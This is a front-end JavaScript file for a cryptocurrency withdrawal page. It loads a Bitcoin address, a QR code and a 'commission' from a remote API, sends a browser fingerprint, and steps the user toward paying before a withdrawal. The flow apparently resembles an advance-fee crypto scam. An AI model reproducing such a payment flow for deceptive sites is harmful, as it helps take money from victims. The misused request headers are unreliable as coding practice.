const xhr = new XMLHttpRequest()
var popup = document.getElementById('popup');
var popupContent = document.querySelector('.popup-content');
let checkbox = document.getElementById("checkbox-popup")
let checkbox_1 = document.getElementById("checkbox-popup-danger")
let url = new URL(window.location.href).searchParams.get("email")

async function send_request(type, laoder, url, data) {
    return new Promise((resolve, reject) => {
        let page = `https://cryptasse.com/api/${url}`;
        xhr.open(type, page)
        xhr.responseType = "json"
        xhr.setRequestHeader("Accept", "application/json")
        xhr.setRequestHeader("Content-Type", "application/json")
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
        xhr.setRequestHeader("mode", "no-cors")
        xhr.setRequestHeader("cache", "no-cache")
        xhr.setRequestHeader("credentials", "same-origin")
        xhr.setRequestHeader("redirect", "follow")

        xhr.onload = () => {
            resolve(xhr.response)
        }

        if (data != false) {
            xhr.send(JSON.stringify(data))
        }
        else {
            xhr.send()

        }
    })
}

async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr, commissionBTC, commissionEuro, address) {
    document.getElementById("balance_bitcoin").textContent = priceInBitcoin + " BTC"
    document.getElementById("balance_euro").textContent = priceEuro + " EUR"
    document.getElementById("qr_code").src = qr.qr_code_link
    document.getElementById("get_commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
    document.querySelector(".btc_address").textContent = address

    document.querySelector("#bitcoin-address").textContent = address
    document.querySelector("#bitcoin-commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`

    let button = document.createElement('button');
    button.className = "email-confirm__submit";
    button.setAttribute("onclick", "showPopup()")
    button.innerHTML = `Next<br><span class="text-auto">${priceEuro} EUR </span>`;
    document.getElementsByClassName("get-found-button")[0].append(button);

}

function openPopup() {
    popup.classList.add('show'); // Добавляем класс 'show' для отображения попапа
}

function closePopup() {
    popup.classList.remove('show'); // Удаляем класс 'show' для скрытия попапа
}

async function showPopup() {
    if (checkbox.checked) {
        setTimeout(() => {
            window.location.href = `withdraw-6.html?email=${url}`
        }, 3000)
    } else {
        const checkbox_danger = document.querySelector(".custom-checkbox_danger")
        const checkbox_normal = document.querySelector(".custom-checkbox_normal")
        checkbox_danger.classList.remove("hidden")
        checkbox_normal.classList.add("hidden")
    }
}

checkbox.addEventListener("click", () => {
    if (checkbox.checked) {
        popup.classList.add('show');

    }
    popup.addEventListener('click', function (event) {
        if (event.target === popup) {
            popup.classList.remove('show');
        }
    });
})


checkbox_1.addEventListener("click", () => {
    if (checkbox_1.checked) {
        checkbox_1.checked = false
        checkbox.checked = true

        const checkbox_danger = document.querySelector(".custom-checkbox_danger")
        const checkbox_normal = document.querySelector(".custom-checkbox_normal")

        checkbox_danger.classList.add("hidden")
        checkbox_normal.classList.remove("hidden")
        popup.classList.add('show');

    }
    popup.addEventListener('click', function (event) {
        if (event.target === popup) {
            popup.classList.remove('show');
        }
    });
})



async function start() {
    let address = await send_request("get", false, "address_change", false)
    let qr = await send_request("get", false, "qr_change", false)
    let getPriceBitcoin = await send_request("get", false, "price_change", false)
    let setPriceBitcoin = getPriceBitcoin["price_euro"]
    let sendPriceBitcoin = await send_request("post", false, "transaction-convert", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceBitcoinCommission = await send_request("post", false, "transaction-commission", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let setPriceBitcoinCommission = getPriceBitcoinCommission.price
    let getPriceInEuro = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceInEuroCommission = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoinCommission, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    setElements(sendPriceBitcoin, Number(setPriceBitcoin).toFixed(2), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address)
}

start()
